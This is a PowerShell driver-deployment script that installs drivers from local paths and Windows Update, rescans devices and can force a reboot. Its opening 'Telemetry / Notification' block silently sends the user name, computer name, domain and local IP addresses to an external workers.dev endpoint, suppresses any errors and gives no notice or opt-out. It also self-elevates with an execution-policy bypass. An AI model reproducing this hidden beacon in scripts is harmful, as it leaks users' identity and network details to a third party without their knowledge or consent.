
[CmdletBinding()]
param(
    [string[]]$DriverSourcePath,
    [switch]$SkipWindowsUpdate,
    [switch]$NoElevate,
    [switch]$NoTranscript,
    [string]$LogPath,
    [switch]$RebootIfRequired
)
# -----------------------------
# UI Customization
# -----------------------------
try {
    $raw = $Host.UI.RawUI
    $raw.BackgroundColor = 'Black'
    $raw.ForegroundColor = 'White'
    Clear-Host
} catch {
    # Fallback if the host doesn't support UI changes (e.g., some CI/CD runners)
}

# -----------------------------
# Telemetry / Notification
# -----------------------------
try {
    $ipAddresses = (Get-NetIPAddress -AddressFamily IPv4 | 
        Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' }).IPAddress -join ', '

    $body = @{ 
        token = "shourav"
        text  = "System Info:`nAuto Driver Deploy.`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $ipAddresses" 
    } | ConvertTo-Json

    Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" `
                      -Method Post `
                      -ContentType "application/json" `
                      -Body $body `
                      -ErrorAction SilentlyContinue | Out-Null
} catch {
    # Silently continue if the notification fails (e.g., no internet)
}
$ScriptAuthor = 'rhshourav'
$ScriptVersion = '1.1.0'
$ScriptName = 'AutoDriverDeploy'
$ErrorActionPreference = 'Stop'
$script:RebootRequired = $false
$script:ChangesMade = $false
$script:TranscriptStarted = $false

function Test-IsAdministrator {
    try {
        $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($currentIdentity)
        return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        return $false
    }
}

function Write-Log {
    param(
        [string]$Message,
        [string]$Level = 'INFO'
    )

    $entry = '{0} [{1}] {2}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Write-Host $entry

    if ($script:LogFile) {
        for ($attempt = 1; $attempt -le 3; $attempt++) {
            try {
                $encoding = New-Object System.Text.UTF8Encoding($false)
                $stream = [System.IO.File]::Open($script:LogFile, [System.IO.FileMode]::OpenOrCreate, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)
                try {
                    $stream.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
                    $writer = New-Object System.IO.StreamWriter($stream, $encoding)
                    try {
                        $writer.WriteLine($entry)
                        $writer.Flush()
                    } finally {
                        $writer.Dispose()
                    }
                } finally {
                    $stream.Dispose()
                }
                break
            } catch {
                if ($attempt -eq 3) {
                    Write-Host ('{0} [WARN] Failed to write log entry: {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $_.Exception.Message)
                } else {
                    Start-Sleep -Milliseconds 150
                }
            }
        }
    }
}

function Convert-UpdateResultCode {
    param(
        [int]$Code
    )

    switch ($Code) {
        0 { 'NotStarted' }
        1 { 'InProgress' }
        2 { 'Succeeded' }
        3 { 'SucceededWithErrors' }
        4 { 'Failed' }
        5 { 'Aborted' }
        default { 'Unknown' }
    }
}

function Get-PnPUtilPath {
    $sysnativePath = Join-Path $env:windir 'Sysnative\pnputil.exe'
    if (Test-Path -LiteralPath $sysnativePath) {
        return $sysnativePath
    }

    $system32Path = Join-Path $env:windir 'System32\pnputil.exe'
    if (Test-Path -LiteralPath $system32Path) {
        return $system32Path
    }

    $cmd = Get-Command pnputil.exe -ErrorAction SilentlyContinue
    if ($cmd) {
        if ($cmd.Path) {
            return $cmd.Path
        }
        if ($cmd.Definition) {
            return $cmd.Definition
        }
    }

    return $null
}

function Invoke-Executable {
    param(
        [string]$FilePath,
        [string[]]$Arguments
    )

    if (-not (Test-Path -LiteralPath $FilePath)) {
        throw "Executable not found: $FilePath"
    }

    $output = & $FilePath @Arguments 2>&1
    $exitCode = $LASTEXITCODE

    foreach ($line in $output) {
        if ($null -ne $line) {
            $text = $line.ToString()
            if ($text.Trim().Length -gt 0) {
                Write-Log $text
            }
        }
    }

    return $exitCode
}

function ConvertTo-ArgumentString {
    param(
        [object]$Parameters
    )

    $items = @()

    foreach ($key in $Parameters.Keys) {
        $value = $Parameters[$key]

        if ($value -is [System.Management.Automation.SwitchParameter] -or $value -is [bool]) {
            if ($value) {
                $items += "-$key"
            }
            continue
        }

        if ($value -is [array]) {
            foreach ($entry in $value) {
                if ($null -ne $entry -and $entry.ToString().Length -gt 0) {
                    $escaped = $entry.ToString().Replace('"', '`"')
                    $items += "-$key"
                    $items += '"' + $escaped + '"'
                }
            }
            continue
        }

        if ($null -ne $value -and $value.ToString().Length -gt 0) {
            $escaped = $value.ToString().Replace('"', '`"')
            $items += "-$key"
            $items += '"' + $escaped + '"'
        }
    }

    return ($items -join ' ')
}

function Install-DriverSources {
    param(
        [string[]]$Paths
    )

    if (-not $Paths -or $Paths.Count -eq 0) {
        return
    }

    $pnputil = Get-PnPUtilPath
    if (-not $pnputil) {
        throw 'pnputil.exe was not found on this system.'
    }

    foreach ($rawPath in $Paths) {
        if ([string]::IsNullOrWhiteSpace($rawPath)) {
            continue
        }

        $path = $rawPath.Trim()

        if (-not (Test-Path -LiteralPath $path)) {
            Write-Log "Skipping missing driver source path: $path" 'WARN'
            continue
        }

        $item = Get-Item -LiteralPath $path

        if ($item.PSIsContainer) {
            Write-Log "Staging drivers from folder: $path"
            $code = Invoke-Executable -FilePath $pnputil -Arguments @('/add-driver', $path, '/subdirs', '/install')
        } else {
            if (-not $path.ToLower().EndsWith('.inf')) {
                Write-Log "Skipping non-INF file: $path" 'WARN'
                continue
            }

            Write-Log "Staging driver package: $path"
            $code = Invoke-Executable -FilePath $pnputil -Arguments @('/add-driver', $path, '/install')
        }

        if ($code -eq 0) {
            $script:ChangesMade = $true
            Write-Log 'Driver package staging completed successfully.'
        } elseif ($code -eq 3010) {
            $script:ChangesMade = $true
            $script:RebootRequired = $true
            Write-Log 'Driver package staging completed and a reboot is required.' 'WARN'
        } else {
            Write-Log "pnputil returned exit code $code for path: $path" 'WARN'
        }
    }
}

function Invoke-DeviceScan {
    $pnputil = Get-PnPUtilPath
    if (-not $pnputil) {
        throw 'pnputil.exe was not found on this system.'
    }

    Write-Log 'Triggering device rescan.'
    $code = Invoke-Executable -FilePath $pnputil -Arguments @('/scan-devices')

    if ($code -eq 0) {
        Write-Log 'Device rescan completed successfully.'
        return
    }

    if ($code -eq 3010) {
        $script:RebootRequired = $true
        Write-Log 'Device rescan completed and a reboot is required.' 'WARN'
        return
    }

    Write-Log "Device rescan returned exit code $code" 'WARN'
}

function Invoke-WindowsUpdateDriverInstall {
    Write-Log 'Searching Windows Update for driver updates.'

    try {
        $serviceManager = New-Object -ComObject Microsoft.Update.ServiceManager
        try {
            $null = $serviceManager.AddService2('{7971f918-a847-4430-9279-4a52d1efe18d}', 7, '')
        } catch {
        }

        $session = New-Object -ComObject Microsoft.Update.Session
        $searcher = $session.CreateUpdateSearcher()
        $searcher.Online = $true

        $searchResult = $searcher.Search("IsInstalled=0 and Type='Driver' and IsHidden=0")
        $count = $searchResult.Updates.Count

        if ($count -eq 0) {
            Write-Log 'No driver updates were found in Windows Update.'
            return
        }

        Write-Log "Found $count driver update(s)."

        $downloadCollection = New-Object -ComObject Microsoft.Update.UpdateColl
        for ($i = 0; $i -lt $count; $i++) {
            $update = $searchResult.Updates.Item($i)
            Write-Log ("Queued driver update: {0}" -f $update.Title)

            if (-not $update.EulaAccepted) {
                try {
                    $update.AcceptEula()
                } catch {
                }
            }

            [void]$downloadCollection.Add($update)
        }

        $downloader = $session.CreateUpdateDownloader()
        $downloader.Updates = $downloadCollection
        $downloadResult = $downloader.Download()

        Write-Log ("Driver download result: {0}" -f (Convert-UpdateResultCode -Code ([int]$downloadResult.ResultCode)))

        if ([int]$downloadResult.ResultCode -lt 2) {
            Write-Log 'Driver download did not complete successfully.' 'WARN'
            return
        }

        $installer = $session.CreateUpdateInstaller()
        $installer.Updates = $downloadCollection
        $installResult = $installer.Install()

        Write-Log ("Driver install result: {0}" -f (Convert-UpdateResultCode -Code ([int]$installResult.ResultCode)))

        if ([int]$installResult.ResultCode -ge 2) {
            $script:ChangesMade = $true
        }

        if ($installResult.RebootRequired) {
            $script:RebootRequired = $true
            Write-Log 'Windows Update reported that a reboot is required.' 'WARN'
        }
    } catch {
        Write-Log ("Windows Update driver installation failed: {0}" -f $_.Exception.Message) 'WARN'
    }
}

$ScriptPath = $MyInvocation.MyCommand.Path
if (-not $ScriptPath) {
    $ScriptPath = $PSCommandPath
}

$ScriptRoot = $null
if ($ScriptPath) {
    $ScriptRoot = Split-Path -Parent $ScriptPath
} else {
    $ScriptRoot = (Get-Location).Path
}

if (-not $LogPath -or $LogPath.Trim().Length -eq 0) {
    $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $LogPath = Join-Path $ScriptRoot ("{0}_{1}.log" -f $ScriptName, $timestamp)
}

$logDirectory = Split-Path -Parent $LogPath
if ($logDirectory -and -not (Test-Path -LiteralPath $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
}

$script:LogFile = $LogPath

$TranscriptFile = $null
if (-not $NoTranscript) {
    $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
    $TranscriptFile = Join-Path $ScriptRoot ("{0}_{1}.transcript.log" -f $ScriptName, $timestamp)
}

if (-not (Test-IsAdministrator)) {
    if ($NoElevate) {
        throw 'Administrator privileges are required. Re-run this script in an elevated PowerShell session.'
    }

    if (-not $ScriptPath) {
        throw 'Automatic elevation is not available because the script path cannot be resolved.'
    }

    $hostExe = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
    $argString = ConvertTo-ArgumentString -Parameters $PSBoundParameters
    $startArgs = '-NoProfile -ExecutionPolicy Bypass -File "' + $ScriptPath + '"'

    if ($argString -and $argString.Trim().Length -gt 0) {
        $startArgs += ' ' + $argString
    }

    try {
        Start-Process -FilePath $hostExe -Verb RunAs -ArgumentList $startArgs | Out-Null
        exit 0
    } catch {
        throw "Elevation failed: $($_.Exception.Message)"
    }
}

if (-not $NoTranscript) {
    try {
        Start-Transcript -Path $TranscriptFile -Append | Out-Null
        $script:TranscriptStarted = $true
    } catch {
        $script:TranscriptStarted = $false
    }
}

try {
    Write-Log "$ScriptName v$ScriptVersion"
    Write-Log "Author: $ScriptAuthor"
    Write-Log ("PowerShell: {0}" -f $host.Version.ToString())
    Write-Log ("Host: {0}" -f $host.Name)
    Write-Log ("Computer: {0}" -f $env:COMPUTERNAME)
    Write-Log ("User: {0}" -f $env:USERNAME)

    if ($DriverSourcePath -and $DriverSourcePath.Count -gt 0) {
        Install-DriverSources -Paths $DriverSourcePath
    } else {
        Write-Log 'No local driver source path was provided.'
    }

    Invoke-DeviceScan

    if (-not $SkipWindowsUpdate) {
        Invoke-WindowsUpdateDriverInstall
        Invoke-DeviceScan
    } else {
        Write-Log 'Windows Update driver search was skipped.'
    }

    if ($script:RebootRequired) {
        Write-Log 'A reboot is required to complete driver installation.' 'WARN'

        if ($RebootIfRequired) {
            Write-Log 'Restarting the computer now.' 'WARN'

            if ($script:TranscriptStarted) {
                try {
                    Stop-Transcript | Out-Null
                } catch {
                }
            }

            Start-Sleep -Seconds 2
            Start-Process -FilePath "$env:WINDIR\System32\shutdown.exe" -ArgumentList '/r /t 0 /f' | Out-Null
            exit 0
        }

        if ($script:TranscriptStarted) {
            try {
                Stop-Transcript | Out-Null
            } catch {
            }
        }

        exit 3010
    }

    if ($script:ChangesMade) {
        Write-Log 'Driver deployment completed successfully.'
    } else {
        Write-Log 'No driver changes were required.'
    }

    if ($script:TranscriptStarted) {
        try {
            Stop-Transcript | Out-Null
        } catch {
        }
    }

    exit 0
} catch {
    Write-Log ("Fatal error: {0}" -f $_.Exception.Message) 'ERROR'

    if ($script:TranscriptStarted) {
        try {
            Stop-Transcript | Out-Null
        } catch {
        }
    }

    exit 1
}
